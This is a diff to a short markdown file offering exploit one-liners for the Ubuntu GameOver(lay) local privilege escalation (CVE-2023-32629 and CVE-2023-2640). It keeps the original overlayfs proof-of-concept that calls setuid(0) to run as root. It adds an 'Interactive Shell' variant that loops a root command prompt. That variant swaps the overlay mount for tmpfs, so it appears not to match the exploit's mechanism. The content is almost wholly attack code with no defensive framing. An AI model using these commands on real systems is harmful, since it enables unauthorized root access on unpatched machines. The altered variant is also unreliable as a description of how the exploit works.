@@ -1,5 +1,10 @@
 # Ubuntu GameOver(lay) Local Privilege Escalation CVE-2023–32629 & CVE-2023–2640
 
+## Interactive Shell
+```
+unshare -rm sh -c "mkdir -p l u w m &&cp /usr/bin/python3 l/ &&setcap cap_setuid+eip l/python3 &&mount -t tmpfs none m &&touch m/cok &&l/python3 -c 'import os; os.setuid(0); import subprocess; [subprocess.call(input(\"kaz> \"), shell=True) for _ in iter(int, 1)]'"
+```
+
 ## original poc payload
 ```
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
